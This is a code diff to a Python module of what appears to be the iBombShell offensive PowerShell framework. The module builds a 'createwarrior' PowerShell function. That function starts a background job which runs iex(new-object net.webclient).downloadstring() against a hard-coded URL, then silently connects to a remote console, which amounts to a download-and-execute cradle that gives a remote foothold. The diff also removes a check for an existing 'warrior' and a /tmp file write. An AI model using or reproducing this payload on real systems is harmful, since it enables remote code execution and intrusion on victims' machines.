@@ -1,5 +1,4 @@
 from termcolor import colored, cprint
-from warrior_check import exist_warrior
 from module import Module
 
 
@@ -20,8 +19,7 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior(self.args["warrior"]):
-            function = """function createwarrior{
+        function = """function createwarrior{
                 param(
                     [String] $ip,
                     [String] $port,
@@ -37,22 +35,13 @@ class CustomModule(Module):
                 $url = "http://10.0.0.1/ibombshell"
                 start-job -scriptblock {param($url,$url2) iex(new-object net.webclient).downloadstring("$url"); console -silently -uriConsole "$url2"} -ArgumentList $url,$url2
                 
-}
+                }
 
-"""
-            if self.args["code"]:
-                function += 'createwarrior -ip "{}" -code "{}" -port "{}"'.format(self.args["ip"],self.args["code"],self.args["port"])
-            else:
-                function += 'createwarrior -ip "{}" -port "{}"'.format(self.args["ip"],self.args["port"])
+                 """
+        if self.args["code"]:
+            function += 'createwarrior -ip "{}" -code "{}" -port "{}"'.format(self.args["ip"],self.args["code"],self.args["port"])
+        else:
+            function += 'createwarrior -ip "{}" -port "{}"'.format(self.args["ip"],self.args["port"])
 
             
-
-            # TODO: Reemplazar la escritura por añadido (append)
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                # f.write(routeId)
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
-
-        else:
-            cprint ('[!] Failed... Warrior don´t found', 'red')
+        super(CustomModule, self).run(function)
